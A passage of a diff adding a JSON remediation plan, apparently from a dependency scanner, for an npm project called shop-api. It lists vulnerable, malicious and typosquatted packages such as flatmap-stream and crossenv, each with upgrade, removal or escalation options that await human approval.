+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R1.a",
+            "action": "upgrade",
+            "recommended": true,
+            "description": "Upgrade lodash 4.17.15 -> 4.18.0 (minor)",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "lodash",
+                "value": "4.18.0",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-704d795f51",
+                "GRD-21c00fec6e",
+                "GRD-ad2936893a",
+                "GRD-844e5ccc16",
+                "GRD-a128fcec7d",
+                "GRD-e21d6bab29"
+              ],
+              "score_removed": 497,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver minor change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R1.b",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R1.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R2",
+        "title": "flatmap-stream@0.1.1: malicious-package, vulnerability",
+        "priority": "P1-urgent",
+        "score": 100,
+        "findings": [
+          "GRD-613706260e",
+          "GRD-73005cb429",
+          "GRD-ca39c1eed2"
+        ],
+        "categories": [
+          "malicious-package",
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/flatmap-stream@0.1.1",
+          "name": "flatmap-stream",
+          "version": "0.1.1",
+          "ecosystem": "npm",
+          "direct": false,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "event-stream@3.3.6",
+            "flatmap-stream@0.1.1"
+          ]
+        ],
+        "reachability": {
+          "level": "unknown",
+          "detail": "'event-stream' not imported but referenced in package.json (CLI / config use)",
+          "files": []
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R2.a",
+            "action": "remove",
+            "recommended": true,
+            "description": "Remove 'flatmap-stream' and regenerate the lockfile; block it in policy",
+            "changes": [
+              {
+                "type": "lockfile",
+                "subproject": "",
+                "op": "regenerate"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-613706260e",
+                "GRD-73005cb429",
+                "GRD-ca39c1eed2"
+              ],
+              "score_removed": 300,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "no source file imports it"
+              ]
+            },
+            "follow_up": [
+              "rotate any credentials present on machines that installed it"
+            ],
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R2.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R3",
+        "title": "ua-parser-js@0.7.29: integrity, malicious-package",
+        "priority": "P1-urgent",
+        "score": 100,
+        "findings": [
+          "GRD-98f61e9402",
+          "GRD-d91accc1c1"
+        ],
+        "categories": [
+          "integrity",
+          "malicious-package"
+        ],
+        "component": {
+          "id": "pkg:npm/ua-parser-js@0.7.29",
+          "name": "ua-parser-js",
+          "version": "0.7.29",
+          "ecosystem": "npm",
+          "direct": false,
+          "scope": "prod"
+        },
+        "dependency_paths": [],
+        "reachability": {
+          "level": "orphan",
+          "detail": "no dependency path from the application",
+          "files": []
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R3.a",
+            "action": "remove",
+            "recommended": true,
+            "description": "Remove 'ua-parser-js' and regenerate the lockfile; block it in policy",
+            "changes": [
+              {
+                "type": "lockfile",
+                "subproject": "",
+                "op": "regenerate"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-98f61e9402",
+                "GRD-d91accc1c1"
+              ],
+              "score_removed": 175,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "no source file imports it"
+              ]
+            },
+            "follow_up": [
+              "rotate any credentials present on machines that installed it"
+            ],
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R3.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R4",
+        "title": "event-stream@3.3.6: integrity, vulnerability",
+        "priority": "P1-urgent",
+        "score": 100,
+        "findings": [
+          "GRD-0ed05bf1fe",
+          "GRD-0bb2f898bb"
+        ],
+        "categories": [
+          "integrity",
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/event-stream@3.3.6",
+          "name": "event-stream",
+          "version": "3.3.6",
+          "ecosystem": "npm",
+          "direct": true,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "event-stream@3.3.6"
+          ]
+        ],
+        "reachability": {
+          "level": "unknown",
+          "detail": "'event-stream' not imported but referenced in package.json (CLI / config use)",
+          "files": []
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R4.a",
+            "action": "upgrade",
+            "recommended": true,
+            "description": "Upgrade event-stream 3.3.6 -> 4.0.0 (major)",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "event-stream",
+                "value": "4.0.0",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-0ed05bf1fe",
+                "GRD-0bb2f898bb"
+              ],
+              "score_removed": 175,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "high",
+              "reasons": [
+                "semver major change",
+                "breaking API changes possible; build + tests must pass before approval is final"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R4.b",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R4.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R5",
+        "title": "minimist@1.2.5: integrity, vulnerability",
+        "priority": "P1-urgent",
+        "score": 100,
+        "findings": [
+          "GRD-2dd08017e5",
+          "GRD-cbacc02b07",
+          "GRD-dfc22d0f2f"
+        ],
+        "categories": [
+          "integrity",
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/minimist@1.2.5",
+          "name": "minimist",
+          "version": "1.2.5",
+          "ecosystem": "npm",
+          "direct": true,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "minimist@1.2.5"
+          ]
+        ],
+        "reachability": {
+          "level": "unknown",
+          "detail": "'minimist' not imported but referenced in package.json (CLI / config use)",
+          "files": []
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R5.a",
+            "action": "upgrade",
+            "recommended": true,
+            "description": "Upgrade minimist 1.2.5 -> 1.2.6 (patch)",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "minimist",
+                "value": "1.2.6",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-2dd08017e5",
+                "GRD-cbacc02b07",
+                "GRD-dfc22d0f2f"
+              ],
+              "score_removed": 250,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver patch change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R5.b",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R5.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R6",
+        "title": "crossenv@6.1.1: install-script, malicious-package, typosquat",
+        "priority": "P1-urgent",
+        "score": 100,
+        "findings": [
+          "GRD-ae3966a225",
+          "GRD-d59b7c1df8",
+          "GRD-d2c4aa3ad1"
+        ],
+        "categories": [
+          "install-script",
+          "malicious-package",
+          "typosquat"
+        ],
+        "component": {
+          "id": "pkg:npm/crossenv@6.1.1",
+          "name": "crossenv",
+          "version": "6.1.1",
+          "ecosystem": "npm",
+          "direct": true,
+          "scope": "dev"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "crossenv@6.1.1"
+          ]
+        ],
+        "reachability": {
+          "level": "unknown",
+          "detail": "'crossenv' not imported but referenced in package.json (CLI / config use)",
+          "files": []
+        },
+        "exposure": {
+          "context": "dev-tooling",
+          "production": false,
+          "detail": "devDependency: not installed in production"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R6.a",
+            "action": "remove",
+            "recommended": true,
+            "description": "Remove 'crossenv' and regenerate the lockfile; block it in policy",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "remove-dep",
+                "name": "crossenv"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-ae3966a225",
+                "GRD-d59b7c1df8",
+                "GRD-d2c4aa3ad1"
+              ],
+              "score_removed": 270,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "no source file imports it"
+              ]
+            },
+            "follow_up": [
+              "rotate any credentials present on machines that installed it"
+            ],
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R6.b",
+            "action": "replace",
+            "description": "Replace 'crossenv' with the intended package 'cross-env'",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "remove-dep",
+                "name": "crossenv"
+              },
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "cross-env",
+                "value": "latest-at-apply",
+                "section": "devDependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-ae3966a225",
+                "GRD-d59b7c1df8",
+                "GRD-d2c4aa3ad1"
+              ],
+              "score_removed": 270,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "same intended functionality"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R6.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R7",
+        "title": "body-parser@1.19.0: 2 known vulnerabilities",
+        "priority": "P1-urgent",
+        "score": 95,
+        "findings": [
+          "GRD-b38171a52f",
+          "GRD-7c9e777fa6"
+        ],
+        "categories": [
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/body-parser@1.19.0",
+          "name": "body-parser",
+          "version": "1.19.0",
+          "ecosystem": "npm",
+          "direct": false,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1",
+            "body-parser@1.19.0"
+          ]
+        ],
+        "reachability": {
+          "level": "parent-imported",
+          "detail": "pulled in by 'express', which production code imports (server.js)",
+          "files": [
+            "server.js"
+          ],
+          "via": "express"
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R7.a",
+            "action": "upgrade-parent",
+            "recommended": true,
+            "description": "Upgrade direct dependency express 4.17.1 -> 4.22.0 (minor); express@4.22.0 requires body-parser ~1.20.3, which admits a fixed version",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "express",
+                "value": "4.22.0",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-b38171a52f",
+                "GRD-7c9e777fa6"
+              ],
+              "score_removed": 190,
+              "estimate": true,
+              "note": "expected; the parent upgrade may also change other transitive packages"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver minor change",
+                "1 source file(s) import express: server.js"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R7.b",
+            "action": "override",
+            "description": "Force body-parser@1.20.9 with npm overrides",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-override",
+                "name": "body-parser",
+                "value": "1.20.9"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-b38171a52f",
+                "GRD-7c9e777fa6"
+              ],
+              "score_removed": 190,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "high",
+              "reasons": [
+                "outside the declared range (express declares 1.19.0): parent may break"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R7.c",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R7.d",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R8",
+        "title": "path-to-regexp@0.1.7: 3 known vulnerabilities",
+        "priority": "P1-urgent",
+        "score": 95,
+        "findings": [
+          "GRD-1c5fa4dd94",
+          "GRD-e29370793e",
+          "GRD-1f7ff0a614"
+        ],
+        "categories": [
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/path-to-regexp@0.1.7",
+          "name": "path-to-regexp",
+          "version": "0.1.7",
+          "ecosystem": "npm",
+          "direct": false,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1",
+            "path-to-regexp@0.1.7"
+          ]
+        ],
+        "reachability": {
+          "level": "parent-imported",
+          "detail": "pulled in by 'express', which production code imports (server.js)",
+          "files": [
+            "server.js"
+          ],
+          "via": "express"
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R8.a",
+            "action": "upgrade-parent",
+            "recommended": true,
+            "description": "Upgrade direct dependency express 4.17.1 -> 4.22.0 (minor); express@4.22.0 requires path-to-regexp ~0.1.12, which admits a fixed version",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "express",
+                "value": "4.22.0",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-1c5fa4dd94",
+                "GRD-e29370793e",
+                "GRD-1f7ff0a614"
+              ],
+              "score_removed": 285,
+              "estimate": true,
+              "note": "expected; the parent upgrade may also change other transitive packages"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver minor change",
+                "1 source file(s) import express: server.js"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R8.b",
+            "action": "override",
+            "description": "Force path-to-regexp@0.1.13 with npm overrides",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-override",
+                "name": "path-to-regexp",
+                "value": "0.1.13"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-1c5fa4dd94",
+                "GRD-e29370793e",
+                "GRD-1f7ff0a614"
+              ],
+              "score_removed": 285,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "high",
+              "reasons": [
+                "outside the declared range (express declares 0.1.7): parent may break"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R8.c",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R8.d",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R9",
+        "title": "qs@6.7.0: 3 known vulnerabilities",
+        "priority": "P1-urgent",
+        "score": 95,
+        "findings": [
+          "GRD-c83abdd646",
+          "GRD-89e19feeeb",
+          "GRD-26b5a19a16"
+        ],
+        "categories": [
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/qs@6.7.0",
+          "name": "qs",
+          "version": "6.7.0",
+          "ecosystem": "npm",
+          "direct": false,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1",
+            "qs@6.7.0"
+          ],
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1",
+            "body-parser@1.19.0",
+            "qs@6.7.0"
+          ]
+        ],
+        "reachability": {
+          "level": "parent-imported",
+          "detail": "pulled in by 'express', which production code imports (server.js)",
+          "files": [
+            "server.js"
+          ],
+          "via": "express"
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R9.a",
+            "action": "upgrade-parent",
+            "recommended": true,
+            "description": "Upgrade direct dependency express 4.17.1 -> 4.22.3 (minor); express@4.22.3 requires qs ~6.16.0, which admits a fixed version",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "express",
+                "value": "4.22.3",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-c83abdd646",
+                "GRD-89e19feeeb",
+                "GRD-26b5a19a16"
+              ],
+              "score_removed": 241,
+              "estimate": true,
+              "note": "expected; the parent upgrade may also change other transitive packages"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver minor change",
+                "1 source file(s) import express: server.js"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R9.b",
+            "action": "override",
+            "description": "Force qs@6.16.1 with npm overrides",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-override",
+                "name": "qs",
+                "value": "6.16.1"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-c83abdd646",
+                "GRD-89e19feeeb",
+                "GRD-26b5a19a16"
+              ],
+              "score_removed": 241,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "high",
+              "reasons": [
+                "outside the declared range (body-parser declares 6.7.0; express declares 6.7.0): parent may break"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R9.c",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R9.d",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R10",
+        "title": "node-fetch@2.6.0: 1 known vulnerability",
+        "priority": "P1-urgent",
+        "score": 88,
+        "findings": [
+          "GRD-575e3b161a"
+        ],
+        "categories": [
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/node-fetch@2.6.0",
+          "name": "node-fetch",
+          "version": "2.6.0",
+          "ecosystem": "npm",
+          "direct": true,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "node-fetch@2.6.0"
+          ]
+        ],
+        "reachability": {
+          "level": "unknown",
+          "detail": "'node-fetch' not imported but referenced in package.json (CLI / config use)",
+          "files": []
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R10.a",
+            "action": "upgrade",
+            "recommended": true,
+            "description": "Upgrade node-fetch 2.6.0 -> 2.6.7 (patch)",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "node-fetch",
+                "value": "2.6.7",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-575e3b161a"
+              ],
+              "score_removed": 88,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver patch change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R10.b",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R10.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R11",
+        "title": "express@4.17.1: 2 known vulnerabilities",
+        "priority": "P2-high",
+        "score": 76,
+        "findings": [
+          "GRD-0bd24c48d9",
+          "GRD-b92c8f07bb"
+        ],
+        "categories": [
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/express@4.17.1",
+          "name": "express",
+          "version": "4.17.1",
+          "ecosystem": "npm",
+          "direct": true,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1"
+          ]
+        ],
+        "reachability": {
+          "level": "imported",
+          "detail": "imported directly by 1 production source file(s)",
+          "files": [
+            "server.js"
+          ]
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R11.a",
+            "action": "upgrade",
+            "recommended": true,
+            "description": "Upgrade express 4.17.1 -> 4.20.0 (minor)",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "express",
+                "value": "4.20.0",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-0bd24c48d9",
+                "GRD-b92c8f07bb"
+              ],
+              "score_removed": 141,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver minor change",
+                "1 source file(s) import express: server.js"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R11.b",
+            "action": "accept",
